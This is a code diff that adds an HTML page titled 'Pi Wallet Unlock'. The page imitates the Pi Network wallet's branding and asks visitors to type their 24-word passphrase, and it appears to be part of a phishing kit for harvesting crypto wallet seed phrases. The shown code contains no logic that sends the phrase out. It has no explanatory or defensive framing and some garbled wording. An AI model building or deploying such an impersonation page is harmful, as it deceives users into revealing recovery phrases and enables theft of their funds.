@@ -1,0 +1,148 @@
+"<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Pi Wallet Unlock</title>
+  <style>
+    :root {
+      --purple: #5e2e91;
+      --white: #ffffff;
+      --text-dark: #111111;
+      --gray: #6b7280;
+      --light-purple: #f3e8ff;
+    }
+
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background-color: var(--white);
+      color: var(--text-dark);
+      margin: 0;
+      padding: 0;
+      text-align: center;
+    }
+
+    .topbar {
+      background-color: var(--purple);
+      padding: 8px 16px;
+      color: white;
+      font-size: 1rem;
+      font-weight: bold;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      position: relative;
+      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+    }
+
+    .topbar .back {
+      position: absolute;
+      left: 12px;
+      font-size: 1.2rem;
+      cursor: pointer;
+    }
+
+    .topbar img {
+      height: 20px;
+    }
+
+    .content {
+      padding: 24px 16px;
+    }
+
+    .content h2 {
+      margin-bottom: 20px;
+      font-size: 1.2rem;
+    }
+
+    .passphrase-box {
+      border: 1px solid #ccc;
+      border-radius: 12px;
+      padding: 16px;
+      width: 90%;
+      max-width: 400px;
+      margin: 0 auto 20px auto;
+      box-sizing: border-box;
+    }
+
+    .passphrase-box textarea {
+      width: 100%;
+      height: 100px;
+      border: none;
+      outline: none;
+      resize: none;
+      font-size: 1rem;
+      font-family: 'Segoe UI', sans-serif;
+    }
+
+    .btn-border {
+      border: 2px solid var(--purple);
+      color: var(--purple);
+      background: transparent;
+      padding: 10px 20px;
+      border-radius: 8px;
+      font-weight: bold;
+      cursor: pointer;
+      margin-bottom: 16px;
+    }
+
+    .btn-filled {
+      background-color: var(--purple);
+      color: white;
+      border-radius: 8px;
+      padding: 10px 20px;
+      border: none;
+      font-weight: bold;
+      cursor: pointer;
+      margin-bottom: 20px;
+    }
+
+    .note {
+      font-size: 0.9rem;
+      color: var(--gray);
+      max-width: 400px;
+      margin: 0 auto 16px auto;
+      text-align: left;
+    }
+
+    .note a.inline-link {
+      background-color: var(--light-purple);
+      color: var(--purple);
+      text-decoration: none;
+      font-weight: bold;
+      padding: 2px 4px;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <div class="topbar">
+    <div class="back" onclick="window.location.href='index.html'">&lt;</div>
+    <img src="https://ik.imagekit.io/pinet/Pi/Wallet%20click.png?updatedAt=1753819802260" alt="Wallet" />
+    Wallet
+    <img src="https://ik.imagekit.io/pinet/Pi/Pi%20logo.png?updatedAt=1753683705173" alt="Pi Logo" />
+  </div>
+
+  <div class="content">
+    <h2>Unlock Pi Wallet</h2>
+
+    <div class="passphrase-box">
+      <textarea placeholder="Enter your 24-word passphrase here" required></textarea>
+    </div>
+
+    <button class="btn-border">Unlock With Passphrase</button>
+    <br />
+    <button class="btn-filled">Unlock With Fingerprint</button>
+
+    <p class="note">
+      As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.
+    </p>
+
+    <p class="note">
+      Lost your passphrase? <a class="inline-link" onclick="window.location.href='index.html'">You can create a new wallet</a>, but all your it in your previous wallet will be inaccessible.
+    </p>
+  </div>
+</body>
+</html>
